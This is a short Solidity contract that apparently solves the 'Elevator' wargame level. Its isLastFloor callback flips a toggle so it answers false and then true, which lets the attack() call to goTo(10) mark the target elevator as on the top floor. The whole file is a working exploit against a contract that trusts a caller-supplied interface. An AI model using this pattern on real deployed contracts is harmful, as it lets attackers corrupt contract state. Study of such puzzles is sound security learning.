// SPDX-License-Identifier: MIT
pragma solidity 0.8.14;

import "./Elevator.sol";

contract ElevatorAttack {
    Elevator public target;
    bool public toggle;

    constructor(address _target) {
        target = Elevator(_target);
        toggle = true;
    }

    // need to return false when called in the frist time
    // return true when in the second time
    function isLastFloor(uint256) public returns (bool) {
        toggle = !toggle;
        return toggle;
    }

    function attack() public {
        target.goTo(10); // any floor
    }
}
